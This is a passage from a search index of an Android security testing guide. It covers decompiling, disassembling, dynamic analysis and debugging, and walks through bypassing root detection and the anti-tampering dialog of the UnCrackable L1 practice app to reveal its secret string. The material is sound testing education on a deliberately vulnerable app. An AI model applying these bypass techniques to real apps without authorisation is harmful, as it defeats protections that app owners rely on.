environment. When evaluating an application it is important to check the Network Security Configuration file, as often (less secure) debug configurations might be pushed into final release builds by mistake.</p> <p>The implementation and verification of secure connections can be an intricate process and there are numerous aspects to consider. For instance, many applications use other protocols apart from HTTP such as XMPP or plain TCP packets, or perform certificate pinning in an attempt to deter MITM attacks but unfortunately have severe logical bugs in its implementation or an inherently wrong security network configuration.</p> <p>Remember that in most of the cases, just using static analysis will not be enough and might even turn to be extremely inefficient when compared to the dynamic alternatives which will get much more reliable results (e.g. using an interceptor proxy). In this section we've just slightly touched the surface, please refer to  Basic Network Monitoring/Sniffing and also check the test cases in the \"Android Network Communication\" chapter.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0023/","title":"MASTG-TECH-0023: Reviewing Decompiled Java Code","text":"<p>Following the example from  Decompiling Java Code, we assume that you've successfully decompiled and opened the  Android UnCrackable L1 app in  jadx. Once jadx has finished decompiling, you can browse the decompiled classes by selecting them in the file tree. Note that many of the decompiled packages, classes, and methods have weird one-letter names; this is because the bytecode has been \"minified\" with ProGuard at build time. This is a basic type of obfuscation that makes the bytecode a little more difficult to read, but with a fairly simple app like this one, it won't cause you much of a headache. When you're analyzing a more complex app, however, it can get quite annoying.</p> <p>When analyzing obfuscated code, annotating class names, method names, and other identifiers as you go along is a good practice. Open the <code>MainActivity</code> class in the package <code>sg.vantagepoint.uncrackable1</code>. The method <code>verify</code> is called when you tap the \"verify\" button. This method passes the user input to a static method called <code>a.a</code>, which returns a boolean value. It seems plausible that <code>a.a</code> verifies user input, so we'll refactor the code to reflect this.</p> <p></p> <p>Right-click the class name (the first <code>a</code> in <code>a.a</code>) and select <code>Rename</code> from the drop-down menu (or press <code>N</code>). Change the class name to something that makes more sense given what you know about the class so far. For example, you could call it \"Validator\" (you can always revise the name later). <code>a.a</code> now becomes <code>Validator.a</code>. Follow the same procedure to rename the static method <code>a</code> to <code>check_input</code>.</p> <p></p> <p>Congratulations, you just learned the fundamentals of static analysis! It is all about theorizing, annotating, and gradually revising theories about the analyzed program until you understand it completely or, at least, well enough for whatever you want to achieve.</p> <p>Next, Ctrl+click (or Command+click on Mac) on the <code>check_input</code> method. This takes you to the method definition. The decompiled method looks like this:</p> <pre><code>    public static boolean check_input(String str) {\n        byte[] bArrA;\n        byte[] bArr = new byte[0];\n        try {\n            bArrA = sg.vantagepoint.a.a.a(b(\"8d127684cbc37c17616d806cf50473cc\"), Base64.decode(\"5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=\", 0));\n        } catch (Exception e) {\n            Log.d(\"CodeCheck\", \"AES error:\" + e.getMessage());\n            bArrA = bArr;\n        }\n        return str.equals(new String(bArrA));\n    }\n</code></pre> <p>So, you have a Base64-encoded String that's passed to the function <code>a</code> in the package <code>sg.vantagepoint.a.a</code> (again, everything is called <code>a</code>) along with something that looks suspiciously like a hex-encoded encryption key (16 hex bytes = 128bit, a common key length). What exactly does this particular <code>a</code> do? Ctrl-click it to find out.</p> <pre><code>public class a {\n    public static byte[] a(byte[] bArr, byte[] bArr2) {\n        SecretKeySpec secretKeySpec = new SecretKeySpec(bArr, \"AES/ECB/PKCS7Padding\");\n        Cipher cipher = Cipher.getInstance(\"AES\");\n        cipher.init(2, secretKeySpec);\n        return cipher.doFinal(bArr2);\n    }\n}\n</code></pre> <p>Now you're getting somewhere: it's simply standard AES-ECB. Looks like the Base64 string stored in <code>arrby1</code> in <code>check_input</code> is a ciphertext. It is decrypted with 128bit AES, then compared with the user input. As a bonus task, try to decrypt the extracted ciphertext and find the secret value!</p> <p>A faster way to get the decrypted string is to add dynamic analysis, as explained in  Method Hooking.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0024/","title":"MASTG-TECH-0024: Reviewing Disassembled Native Code","text":"<p>Following the example from \"Disassembling Native Code\" we will use different disassemblers to review the disassembled native code.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0024/#radare2","title":"radare2","text":"<p>Once you've opened your file in radare2 you should first get the address of the function you're looking for. You can do this by listing or getting information <code>i</code> about the symbols <code>s</code> (<code>is</code>) and grepping (<code>~</code> radare2's built-in grep) for some keyword, in our case we're looking for JNI related symbols so we enter \"Java\":</p> <pre><code>$ r2 -A HelloWord-JNI/lib/armeabi-v7a/libnative-lib.so\n...\n[0x00000e3c]&gt; is~Java\n003 0x00000e78 0x00000e78 GLOBAL   FUNC   16 Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI\n</code></pre> <p>The method can be found at address <code>0x00000e78</code>. To display its disassembly simply run the following commands:</p> <pre><code>[0x00000e3c]&gt; e emu.str=true;\n[0x00000e3c]&gt; s 0x00000e78\n[0x00000e78]&gt; af\n[0x00000e78]&gt; pdf\n\u256d (fcn) sym.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI 12\n\u2502   sym.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI (int32_t arg1);\n\u2502           ; arg int32_t arg1 @ r0\n\u2502           0x00000e78  ~   0268           ldr r2, [r0]                ; arg1\n\u2502           ;-- aav.0x00000e79:\n\u2502           ; UNKNOWN XREF from aav.0x00000189 (+0x3)\n\u2502           0x00000e79                    unaligned\n\u2502           0x00000e7a      0249           ldr r1, aav.0x00000f3c      ; [0xe84:4]=0xf3c aav.0x00000f3c\n\u2502           0x00000e7c      d2f89c22       ldr.w r2, [r2, 0x29c]\n\u2502           0x00000e80      7944           add r1, pc                  ; \"Hello from C++\" section..rodata\n\u2570           0x00000e82      1047           bx r2\n</code></pre> <p>Let's explain the previous commands:</p> <ul> <li><code>e emu.str=true;</code> enables radare2's string emulation. Thanks to this, we can see the string we're looking for (\"Hello from C++\").</li> <li><code>s 0x00000e78</code> is a seek to the address <code>s 0x00000e78</code>, where our target function is located. We do this so that the following commands apply to this address.</li> <li><code>pdf</code> means print disassembly of function.</li> </ul> <p>Using radare2 you can quickly run commands and exit by using the flags <code>-qc '&lt;commands&gt;'</code>. From the previous steps we know already what to do so we will simply put everything together:</p> <pre><code>$ r2 -qc 'e emu.str=true; s 0x00000e78; af; pdf' HelloWord-JNI/lib/armeabi-v7a/libnative-lib.so\n\n\u256d (fcn) sym.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI 12\n\u2502   sym.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI (int32_t arg1);\n\u2502           ; arg int32_t arg1 @ r0\n\u2502           0x00000e78      0268           ldr r2, [r0]                ; arg1\n\u2502           0x00000e7a      0249           ldr r1, [0x00000e84]        ; [0xe84:4]=0xf3c\n\u2502           0x00000e7c      d2f89c22       ldr.w r2, [r2, 0x29c]\n\u2502           0x00000e80      7944           add r1, pc                  ; \"Hello from C++\" section..rodata\n\u2570           0x00000e82      1047           bx r2\n</code></pre> <p>Notice that in this case we're not starting with the <code>-A</code> flag not running <code>aaa</code>. Instead, we just tell radare2 to analyze that one function by using the analyze function <code>af</code> command. This is one of those cases where we can speed up our workflow because you're focusing on some specific part of an app.</p> <p>The workflow can be further improved by using r2ghidra, a deep integration of Ghidra decompiler for radare2. r2ghidra generates decompiled C code, which can aid in quickly analyzing the binary.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0024/#ida-pro","title":"IDA Pro","text":"<p>We assume that you've successfully opened <code>lib/armeabi-v7a/libnative-lib.so</code> in IDA pro. Once the file is loaded, click into the \"Functions\" window on the left and press <code>Alt+t</code> to open the search dialog. Enter \"java\" and hit enter. This should highlight the <code>Java_sg_vantagepoint_helloworld_ MainActivity_stringFromJNI</code> function. Double-click the function to jump to its address in the disassembly Window. \"Ida View-A\" should now show the disassembly of the function.</p> <p></p> <p>Not a lot of code there, but you should analyze it. The first thing you need to know is that the first argument passed to every JNI function is a JNI interface pointer. An interface pointer is a pointer to a pointer. This pointer points to a function table: an array of even more pointers, each of which points to a JNI interface function (is your head spinning yet?). The function table is initialized by the Java VM and allows the native function to interact with the Java environment.</p> <p></p> <p>With that in mind, let's have a look at each line of assembly code.</p> <pre><code>LDR  R2, [R0]\n</code></pre> <p>Remember: the first argument (in R0) is a pointer to the JNI function table pointer. The <code>LDR</code> instruction loads this function table pointer into R2.</p> <pre><code>LDR  R1, =aHelloFromC\n</code></pre> <p>This instruction loads into R1 the PC-relative offset of the string \"Hello from C++\". Note that this string comes directly after the end of the function block at offset 0xe84. Addressing relative to the program counter allows the code to run independently of its position in memory.</p> <pre><code>LDR.W  R2, [R2, #0x29C]\n</code></pre> <p>This instruction loads the function pointer from offset 0x29C into the JNI function pointer table pointed to by R2. This is the <code>NewStringUTF</code> function. You can look at the list of function pointers in jni.h, which is included in the Android NDK. The function prototype looks like this:</p> <pre><code>jstring     (*NewStringUTF)(JNIEnv*, const char*);\n</code></pre> <p>The function takes two arguments: the JNIEnv pointer (already in R0) and a String pointer. Next, the current value of PC is added to R1, resulting in the absolute address of the static string \"Hello from C++\" (PC + offset).</p> <pre><code>ADD  R1, PC\n</code></pre> <p>Finally, the program executes a branch instruction to the <code>NewStringUTF</code> function pointer loaded into R2:</p> <pre><code>BX   R2\n</code></pre> <p>When this function returns, R0 contains a pointer to the newly constructed UTF string. This is the final return value, so R0 is left unchanged and the function returns.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0024/#ghidra","title":"Ghidra","text":"<p>After opening the library in Ghidra we can see all the functions defined in the Symbol Tree panel under Functions. The native library for the current application is relatively very small. There are three user defined functions: <code>FUN_001004d0</code>, <code>FUN_0010051c</code>, and <code>Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI</code>. The other symbols are not user defined and are generated for proper functioning of the shared library. The instructions in the function <code>Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI</code> are already discussed in detail in previous sections. In this section we can look into the decompilation of the function.</p> <p>Inside the current function there is a call to another function, whose address is obtained by accessing an offset in the <code>JNIEnv</code> pointer (found as <code>plParm1</code>). This logic has been diagrammatically demonstrated above as well. The corresponding C code for the disassembled function is shown in the Decompiler window. This decompiled C code makes it much easier to understand the function call being made. Since this function is small and extremely simple, the decompilation output is very accurate, this can change drastically when dealing with complex functions.</p> <p></p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0025/","title":"MASTG-TECH-0025: Automated Static Analysis","text":"<p>You should use tools for efficient static analysis. They allow the tester to focus on the more complicated business logic. A plethora of static code analyzers are available, ranging from open source scanners to full-blown enterprise-ready scanners. The best tool for the job depends on budget, client requirements, and the tester's preferences.</p> <p>Some static analyzers rely on the availability of the source code; others take the compiled APK as input. Keep in mind that static analyzers may not be able to find all problems by themselves even though they can help us focus on potential problems. Review each finding carefully and try to understand what the app is doing to improve your chances of finding vulnerabilities.</p> <p>Configure the static analyzer properly to reduce the likelihood of false positives and maybe only select several vulnerability categories in the scan. The results generated by static analyzers can otherwise be overwhelming, and your efforts can be counterproductive if you must manually investigate a large report.</p> <p>There are several open source tools for automated security analysis of an APK.</p> <ul> <li>Androbugs</li> <li>JAADAS (archived)</li> <li> MobSF</li> <li>QARK</li> </ul>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0026/","title":"MASTG-TECH-0026: Dynamic Analysis on Non-Rooted Devices","text":"<p>Non-rooted devices have the benefit of replicating an environment that the application is intended to run on.</p> <p>Thanks to tools like  objection, you can patch the app in order to test it like if you were on a rooted device (but of course being jailed to that one app). To do that you have to perform one additional step: patch the APK to include the Frida gadget library.</p> <p>Now you can use objection to dynamically analyze the application on non-rooted devices.</p> <p>The following commands summarize how to patch and start dynamic analysis using objection using the  Android UnCrackable L1 as an example:</p> <pre><code># Download the Uncrackable APK\n$ wget https://raw.githubusercontent.com/OWASP/mastg/master/Crackmes/Android/Level_01/UnCrackable-Level1.apk\n# Patch the APK with the Frida Gadget\n$ objection patchapk --source UnCrackable-Level1.apk\n# Install the patched APK on the android phone\n$ adb install UnCrackable-Level1.objection.apk\n# After running the mobile phone, objection will detect the running frida-server through the APK\n$ objection explore\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0027/","title":"MASTG-TECH-0027: Get Open Files","text":"<p>You can use <code>lsof</code> with the flag <code>-p &lt;pid&gt;</code> to return the list of open files for the specified process. See the man page for more options.</p> <pre><code># lsof -p 6233\nCOMMAND     PID       USER   FD      TYPE             DEVICE  SIZE/OFF       NODE NAME\n.foobar.c  6233     u0_a97  cwd       DIR                0,1         0          1 /\n.foobar.c  6233     u0_a97  rtd       DIR                0,1         0          1 /\n.foobar.c  6233     u0_a97  txt       REG             259,11     23968        399 /system/bin/app_process64\n.foobar.c  6233     u0_a97  mem   unknown                                         /dev/ashmem/dalvik-main space (region space) (deleted)\n.foobar.c  6233     u0_a97  mem       REG              253,0   2797568    1146914 /data/dalvik-cache/arm64/system@framework@boot.art\n.foobar.c  6233     u0_a97  mem       REG              253,0   1081344    1146915 /data/dalvik-cache/arm64/system@framework@boot-core-libart.art\n...\n</code></pre> <p>In the above output, the most relevant fields for us are:</p> <ul> <li><code>NAME</code>: path of the file.</li> <li><code>TYPE</code>: type of the file, for example, file is a directory or a regular file.</li> </ul> <p>This can be extremely useful to spot unusual files when monitoring applications using obfuscation or other anti-reverse engineering techniques, without having to reverse the code. For instance, an application might be performing encryption-decryption of data and storing it in a file temporarily.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0028/","title":"MASTG-TECH-0028: Get Open Connections","text":"<p>You can find system-wide networking information in <code>/proc/net</code> or just by inspecting the <code>/proc/&lt;pid&gt;/net</code> directories (for some reason not process specific). There are multiple files present in these directories, of which <code>tcp</code>, <code>tcp6</code> and <code>udp</code> might be considered relevant from the tester's perspective.</p> <pre><code># cat /proc/7254/net/tcp\nsl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode\n...\n69: 1101A8C0:BB2F 9A447D4A:01BB 01 00000000:00000000 00:00000000 00000000 10093        0 75412 1 0000000000000000 20 3 19 10 -1\n70: 1101A8C0:917C E3CB3AD8:01BB 01 00000000:00000000 00:00000000 00000000 10093        0 75553 1 0000000000000000 20 3 23 10 -1\n71: 1101A8C0:C1E3 9C187D4A:01BB 01 00000000:00000000 00:00000000 00000000 10093        0 75458 1 0000000000000000 20 3 19 10 -1\n...\n</code></pre> <p>In the output above, the most relevant fields for us are:</p> <ul> <li><code>rem_address</code>: remote address and port number pair (in hexadecimal representation).</li> <li><code>tx_queue</code> and <code>rx_queue</code>: the outgoing and incoming data queue in terms of kernel memory usage. These fields give an indication how actively the connection is being used.</li> <li><code>uid</code>: containing the effective UID of the creator of the socket.</li> </ul> <p>Another alternative is to use the <code>netstat</code> command, which also provides information about the network activity for the complete system in a more readable format, and can be easily filtered as per our requirements. For instance, we can easily filter it by PID:</p> <pre><code># netstat -p | grep 24685\nActive Internet connections (w/o servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program Name\ntcp        0      0 192.168.1.17:47368      172.217.194.103:https   CLOSE_WAIT  24685/com.google.android.youtube\ntcp        0      0 192.168.1.17:47233      172.217.194.94:https    CLOSE_WAIT  24685/com.google.android.youtube\ntcp        0      0 192.168.1.17:38480      sc-in-f100.1e100.:https ESTABLISHED 24685/com.google.android.youtube\ntcp        0      0 192.168.1.17:44833      74.125.24.91:https      ESTABLISHED 24685/com.google.android.youtube\ntcp        0      0 192.168.1.17:38481      sc-in-f100.1e100.:https ESTABLISHED 24685/com.google.android.youtube\n...\n</code></pre> <p><code>netstat</code> output is clearly more user friendly than reading <code>/proc/&lt;pid&gt;/net</code>. The most relevant fields for us, similar to the previous output, are following:</p> <ul> <li><code>Foreign Address</code>: remote address and port number pair (port number can be replaced with the well-known name of a protocol associated with the port).</li> <li><code>Recv-Q</code> and <code>Send-Q</code>: Statistics related to receive and send queue. Gives an indication on how actively the connection is being used.</li> <li><code>State</code>: the state of a socket, for example, if the socket is in active use (<code>ESTABLISHED</code>) or closed (<code>CLOSED</code>).</li> </ul>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0029/","title":"MASTG-TECH-0029: Get Loaded Native Libraries","text":"","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0029/#using-process-memory-maps","title":"Using Process Memory Maps","text":"<p>The file <code>/proc/&lt;pid&gt;/maps</code> contains the currently mapped memory regions and their access permissions. Using this file we can get the list of the libraries loaded in the process.</p> <pre><code># cat /proc/9568/maps\n12c00000-52c00000 rw-p 00000000 00:04 14917                              /dev/ashmem/dalvik-main space (region space) (deleted)\n6f019000-6f2c0000 rw-p 00000000 fd:00 1146914                            /data/dalvik-cache/arm64/system@framework@boot.art\n...\n7327670000-7329747000 r--p 00000000 fd:00 1884627                        /data/app/com.google.android.gms-4FJbDh-oZv-5bCw39jkIMQ==/oat/arm64/base.odex\n..\n733494d000-7334cfb000 r-xp 00000000 fd:00 1884542                        /data/app/com.google.android.youtube-Rl_hl9LptFQf3Vf-JJReGw==/lib/arm64/libcronet.80.0.3970.3.so\n...\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0029/#using-frida","title":"Using Frida","text":"<p>You can retrieve process related information straight from the Frida CLI by using the <code>Process</code> command. Within the <code>Process</code> command the function <code>enumerateModules</code> lists the libraries loaded into the process memory.</p> <pre><code>[Huawei Nexus 6P::sg.vantagepoint.helloworldjni]-&gt; Process.enumerateModules()\n[\n    {\n        \"base\": \"0x558a442000\",\n        \"name\": \"app_process64\",\n        \"path\": \"/system/bin/app_process64\",\n        \"size\": 32768\n    },\n    {\n        \"base\": \"0x78bc984000\",\n        \"name\": \"libandroid_runtime.so\",\n        \"path\": \"/system/lib64/libandroid_runtime.so\",\n        \"size\": 2011136\n    },\n...\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0030/","title":"MASTG-TECH-0030: Sandbox Inspection","text":"<p>The application data is stored in a sandboxed directory present at <code>/data/data/&lt;app_package_name&gt;</code>. The content of this directory has already been discussed in detail in  Accessing App Data Directories.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0031/","title":"MASTG-TECH-0031: Debugging","text":"<p>So far, you've been using static analysis techniques without running the target apps. In the real world, especially when reversing malware or more complex apps, pure static analysis is very difficult. Observing and manipulating an app during runtime makes it much, much easier to decipher its behavior. Next, we'll have a look at dynamic analysis methods that help you do just that.</p> <p>Android apps support two different types of debugging: Debugging on the level of the Java runtime with the Java Debug Wire Protocol (JDWP), and Linux/Unix-style ptrace-based debugging on the native layer, both of which are valuable to reverse engineers.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0031/#debugging-release-apps","title":"Debugging Release Apps","text":"<p>Dalvik and ART support the JDWP, a protocol for communication between the debugger and the Java virtual machine (VM) that it debugs. JDWP is a standard debugging protocol that's supported by all command line tools and Java IDEs, including jdb, IntelliJ, and Eclipse. Android's implementation of JDWP also includes hooks for supporting extra features implemented by the Dalvik Debug Monitor Server (DDMS).</p> <p>A JDWP debugger allows you to step through Java code, set breakpoints on Java methods, and inspect and modify local and instance variables. You'll use a JDWP debugger most of the time you debug \"normal\" Android apps (i.e., apps that don't make many calls to native libraries).</p> <p>In the following section, we'll show how to solve the  Android UnCrackable L1 with jdb alone. Note that this is not an efficient way to solve this crackme. Actually you can do it much faster with Frida and other methods, which we'll introduce later in the guide. This, however, serves as an introduction to the capabilities of the Java debugger.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0031/#debugging-with-jdb","title":"Debugging with jdb","text":"<p>The <code>adb</code> command line tool was introduced in the \"Android Basic Security Testing\" chapter. You can use its <code>adb jdwp</code> command to list the process IDs of all debuggable processes running on the connected device (i.e., processes hosting a JDWP transport). With the <code>adb forward</code> command, you can open a listening socket on your host computer and forward this socket's incoming TCP connections to the JDWP transport of a chosen process.</p> <pre><code>$ adb jdwp\n12167\n$ adb forward tcp:7777 jdwp:12167\n</code></pre> <p>You're now ready to attach jdb. Attaching the debugger, however, causes the app to resume, which you don't want. You want to keep it suspended so that you can explore first. To prevent the process from resuming, pipe the <code>suspend</code> command into jdb:</p> <pre><code>$ { echo \"suspend\"; cat; } | jdb -attach localhost:7777\nInitializing jdb ...\n&gt; All threads suspended.\n&gt;\n</code></pre> <p>You're now attached to the suspended process and ready to go ahead with the jdb commands. Entering <code>?</code> prints the complete list of commands. Unfortunately, the Android VM doesn't support all available JDWP features. For example, the <code>redefine</code> command, which would let you redefine a class code is not supported. Another important restriction is that line breakpoints won't work because the release bytecode doesn't contain line information. Method breakpoints do work, however. Useful working commands include:</p> <ul> <li>classes: list all loaded classes</li> <li>class/methods/fields class id: Print details about a class and list its methods and fields</li> <li>locals: print local variables in current stack frame</li> <li>print/dump expr: print information about an object</li> <li>stop in method: set a method breakpoint</li> <li>clear method: remove a method breakpoint</li> <li>set lvalue = expr: assign new value to field/variable/array element</li> </ul> <p>Let's revisit the decompiled code from the  Android UnCrackable L1 and think about possible solutions. A good approach would be suspending the app in a state where the secret string is held in a variable in plain text so you can retrieve it. Unfortunately, you won't get that far unless you deal with the root/tampering detection first.</p> <p>Review the code and you'll see that the method <code>sg.vantagepoint.uncrackable1.MainActivity.a</code> displays the \"This in unacceptable...\" message box. This method creates an <code>AlertDialog</code> and sets a listener class for the <code>onClick</code> event. This class (named <code>b</code>) has a callback method will terminates the app once the user taps the OK button. To prevent the user from simply canceling the dialog, the <code>setCancelable</code> method is called.</p> <pre><code>  private void a(final String title) {\n        final AlertDialog create = new AlertDialog$Builder((Context)this).create();\n        create.setTitle((CharSequence)title);\n        create.setMessage((CharSequence)\"This in unacceptable. The app is now going to exit.\");\n        create.setButton(-3, (CharSequence)\"OK\", (DialogInterface$OnClickListener)new b(this));\n        create.setCancelable(false);\n        create.show();\n    }\n</code></pre> <p>You can bypass this with a little runtime tampering. With the app still suspended, set a method breakpoint on <code>android.app.Dialog.setCancelable</code> and resume the app.</p> <pre><code>&gt; stop in android.app.Dialog.setCancelable\nSet breakpoint android.app.Dialog.setCancelable\n&gt; resume\nAll threads resumed.\n&gt;\nBreakpoint hit: \"thread=main\", android.app.Dialog.setCancelable(), line=1,110 bci=0\nmain[1]\n</code></pre> <p>The app is now suspended at the first instruction of the <code>setCancelable</code> method. You can print the arguments passed to <code>setCancelable</code> with the <code>locals</code> command (the arguments are shown incorrectly under \"local variables\").</p> <pre><code>main[1] locals\nMethod arguments:\nLocal variables:\nflag = true\n</code></pre> <p><code>setCancelable(true)</code> was called, so this can't be the call we're looking for. Resume the process with the <code>resume</code> command.</p> <pre><code>main[1] resume\nBreakpoint hit: \"thread=main\", android.app.Dialog.setCancelable(), line=1,110 bci=0\nmain[1] locals\nflag = false\n</code></pre> <p>You've now reached a call to <code>setCancelable</code> with the argument <code>false</code>. Set the variable to <code>true</code> with the <code>set</code> command and resume.</p> <pre><code>main[1] set flag = true\n flag = true = true\nmain[1] resume\n</code></pre> <p>Repeat this process, setting <code>flag</code> to <code>true</code> each time the breakpoint is reached, until the alert box is finally displayed (the breakpoint will be reached five or six times). The alert box should now be cancelable! Tap the screen next to the box and it will close without terminating the app.</p> <p>Now that the anti-tampering is out of the way, you're ready to extract the secret string! In the \"static analysis\" section, you saw that the string is decrypted with AES, then compared with the string input to the message box. The method <code>equals</code> of the <code>java.lang.String</code> class compares the string input with the secret string. Set a method breakpoint on <code>java.lang.String.equals</code>, enter an arbitrary text string in the edit field, and tap the \"verify\" button. Once the breakpoint is reached, you can read the method argument with the <code>locals</code> command.</p> <pre><code>&gt; stop in java.lang.String.equals\nSet breakpoint java.lang.String.equals\n&gt;\nBreakpoint hit: \"thread=main\", java.lang.String.equals(), line=639 bci=2\n\nmain[1] locals\nMethod arguments:\nLocal variables:\nother = \"radiusGravity\"\nmain[1] cont\n\nBreakpoint hit: \"thread=main\", java.lang.String.equals(), line=639 bci=2\n\nmain[1] locals\nMethod arguments:\nLocal variables:\nother = \"I want to believe\"\nmain[1] cont\n</code></pre> <p>This is the plaintext string you're looking for!</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0031/#debugging-with-an-ide","title":"Debugging with an IDE","text":"<p>Setting up a project in an IDE with the decompiled sources is a neat trick that allows you to set method breakpoints directly in the source code. In most cases, you should be able to single-step through the app and inspect the state of variables with the GUI. The experience won't be perfect, it's not the original source code after all, so you won't be able to set line breakpoints and things will sometimes simply not work correctly. Then again, reversing code is never easy, and efficiently navigating and debugging plain old Java code is a pretty convenient way of doing it. A similar method has been described in the NetSPI blog.</p> <p>To set up IDE debugging, first create your Android project in IntelliJ and copy the decompiled Java sources into the source folder as described above in the  Reviewing Decompiled Java Code. On the device, choose the app as debug app on the \"Developer options\" ( Android UnCrackable L1 in this tutorial), and make sure you've switched on the \"Wait For Debugger\" feature.</p> <p>Once you tap the app icon from the launcher, it will be suspended in \"Wait For Debugger\" mode.</p> <p></p> <p>Now you can set breakpoints and attach to the app process with the \"Attach Debugger\" toolbar button.</p> <p></p> <p>Note that only method breakpoints work when debugging an app from decompiled sources. Once a method breakpoint is reached, you'll get the chance to single step during the method execution.</p> <p></p> <p>After you choose the app from the list, the debugger will attach to the app process and you'll reach the breakpoint that was set on the <code>onCreate</code> method. This app triggers anti-debugging and anti-tampering controls within the <code>onCreate</code> method. That's why setting a breakpoint on the <code>onCreate</code> method just before the anti-tampering and anti-debugging checks are performed is a good idea.</p> <p>Next, single-step through the <code>onCreate</code> method by clicking \"Force Step Into\" in Debugger view. The \"Force Step Into\" option allows you to debug the Android framework functions and core Java classes that are normally ignored by debuggers.</p> <p></p> <p>Once you \"Force Step Into\", the debugger will stop at the beginning of the next method, which is the <code>a</code> method of the class <code>sg.vantagepoint.a.c</code>.</p> <p></p> <p>This method searches for the \"su\" binary within a list of directories (<code>/system/xbin</code> and others). Since you're running the app on a rooted device/emulator, you need to defeat this check by manipulating variables and/or function return values.</p> <p>You can see the directory names inside the \"Variables\" window by clicking \"Step Over\" the Debugger view to step into and through the <code>a</code> method.</p> <p></p> <p>Step into the <code>System.getenv</code> method with the \"Force Step Into\" feature.</p> <p>After you get the colon-separated directory names, the debugger cursor will return to the beginning of the <code>a</code> method, not to the next executable line. This happens because you're working on the decompiled code instead of the source code. This skipping makes following the code flow crucial to debugging decompiled applications. Otherwise, identifying the next line to be executed would become complicated.</p> <p>If you don't want to debug core Java and Android classes, you can step out of the function by clicking \"Step Out\" in the Debugger view. Using \"Force Step Into\" might be a good idea once you reach the decompiled sources and \"Step Out\" of the core Java and Android classes. This will help speed up debugging while you keep an eye on the return values of the core class functions.</p> <p></p> <p>After the <code>a</code> method gets the directory names, it will search for the <code>su</code> binary within these directories. To defeat this check, step through the detection method and inspect the variable content. Once execution reaches a location where the <code>su</code> binary would be detected, modify one of the variables holding the file name or directory name by pressing F2 or right-clicking and choosing \"Set Value\".</p> <p></p> <p></p> <p>Once you modify the binary name or the directory name, <code>File.exists</code> should return <code>false</code>.</p> <p></p> <p>This defeats the first root detection control of the app. The remaining anti-tampering and anti-debugging controls can be defeated in similar ways so that you can finally reach the secret string verification functionality.</p> <p></p> <p></p> <p>The secret code is verified by the method <code>a</code> of class <code>sg.vantagepoint.uncrackable1.a</code>. Set a breakpoint on method <code>a</code> and \"Force Step Into\" when you reach the breakpoint. Then, single-step until you reach the call to <code>String.equals</code>. This is where user input is compared with the secret string.</p> <p></p> <p>You can see the secret string in the \"Variables\" view when you reach the <code>String.equals</code> method call.</p> <p></p> <p></p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0031/#debugging-native-code","title":"Debugging Native Code","text":"<p>Native code on Android is packed into ELF shared libraries and runs just like any other native Linux program. Consequently, you can debug it with standard tools (including GDB and built-in IDE debuggers such as IDA Pro) as long as they support the device's processor architecture (most devices are based on ARM chipsets, so this is usually not an issue).</p> <p>You'll now set up your JNI demo app, HelloWorld-JNI.apk, for debugging. It's the same APK you downloaded in \"Statically Analyzing Native Code\". Use <code>adb install</code> to install it on your device or on an emulator.</p> <pre><code>adb install HelloWorld-JNI.apk\n</code></pre> <p>If you followed the instructions at the beginning of this chapter, you should already have the Android NDK. It contains prebuilt versions of gdbserver for various architectures. Copy the gdbserver binary to your device:</p> <pre><code>adb push $NDK/prebuilt/android-arm/gdbserver/gdbserver /data/local/tmp\n</code></pre> <p>The <code>gdbserver --attach</code> command causes gdbserver to attach to the running process and bind to the IP address and port specified in <code>comm</code>, which in this case is a HOST:PORT descriptor. Start HelloWorldJNI on the device, then connect to the device and determine the PID of the HelloWorldJNI process (sg.vantagepoint.helloworldjni). Then switch to the root user and attach <code>gdbserver</code>:</p> <pre><code>$ adb shell\n$ ps | grep helloworld\nu0_a164   12690 201   1533400 51692 ffffffff 00000000 S sg.vantagepoint.helloworldjni\n$ su\n# /data/local/tmp/gdbserver --attach localhost:1234 12690\nAttached; pid = 12690\nListening on port 1234\n</code></pre> <p>The process is now suspended, and <code>gdbserver</code> is listening for debugging clients on port <code>1234</code>. With the device connected via USB, you can forward this port to a local port on the host with the <code>adb forward</code> command:</p> <pre><code>adb forward tcp:1234 tcp:1234\n</code></pre> <p>You'll now use the prebuilt version of <code>gdb</code> included in the NDK toolchain.</p> <pre><code>$ $TOOLCHAIN/bin/gdb libnative-lib.so\nGNU gdb (GDB) 7.11\n(...)\nReading symbols from libnative-lib.so...(no debugging symbols found)...done.\n(gdb) target remote :1234\nRemote debugging using :1234\n0xb6e0f124 in ?? ()\n</code></pre> <p>You have successfully attached to the process! The only problem is that you're already too late to debug the JNI function <code>StringFromJNI</code>; it only runs once, at startup. You can solve this problem by activating the \"Wait for Debugger\" option. Go to Developer Options -&gt; Select debug app and pick 